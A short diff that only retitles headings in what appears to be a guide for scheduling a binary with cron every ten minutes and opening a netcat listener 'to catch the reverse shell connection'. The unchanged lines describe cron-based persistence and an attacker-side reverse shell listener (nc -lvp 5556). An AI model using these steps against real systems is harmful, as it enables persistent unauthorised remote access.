@@ -1,4 +1,4 @@
-### **STEP 1: CREATE THE CRON JOB**
+### **Step 1: Create the Cron Job**
 
 1. Open the crontab editor:
     `crontab -e`
@@ -9,19 +9,19 @@
 4. If you need to specify a user, add the user before the command:
     `*/10 * * * * pelle /path/to/binary`
 
-### **STEP 2: VERIFY THE CRON JOB**
+### **Step 2: Verify the Cron Job**
 
 1. Check if the cron service is active:
     `service crond status`
 2. If the cron service is not started, start it:
     `service crond start`
 
-### **STEP 3: SET UP A NETCAT LISTENER**
+### **Step 3: Set Up a Netcat Listener**
 
 1. On your local machine, set up a netcat listener to catch the reverse shell connection:
     `nc -lvp 5556`
 
-### **STEP 4: TROUBLESHOOTING AND VERIFICATION**
+### **Step 4: Troubleshooting and Verification**
 
 1. Verify that the cron job is running:
     `crontab -l`
